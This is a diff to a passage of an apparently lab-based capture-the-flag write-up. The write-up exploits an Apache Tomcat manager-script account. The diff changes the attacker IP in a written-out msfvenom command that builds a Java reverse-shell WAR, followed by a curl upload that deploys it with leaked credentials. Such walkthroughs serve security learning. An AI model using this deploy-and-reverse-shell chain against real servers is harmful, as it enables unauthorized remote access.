@@ -61,7 +61,7 @@ Tomcat creds, in cleartext, read through a hole in a different webapp on a diffe
 Those creds are missing `manager-gui`, so the pretty web UI slams the door. But the `tomcat` user *does* have `manager-script` — access to the text-only deploy API at `/manager/text`. The GUI was never the point. Tomcat will happily deploy a packaged web app (`.war`) over a plain HTTP PUT, and a `.war` is just a zip with a servlet inside. `msfvenom` builds one that calls home:
 
 ```
-# msfvenom -p java/shell_reverse_tcp lhost=10.10.14.6 lport=443 -f war -o rev.war
+# msfvenom -p java/shell_reverse_tcp lhost=10.10.14.4 lport=443 -f war -o rev.war
 # curl -u 'tomcat:$3cureP4s5w0rd123!' \
     http://10.10.10.194:8080/manager/text/deploy?path=/iceberg --upload-file rev.war
 OK - Deployed application at context path [/iceberg]
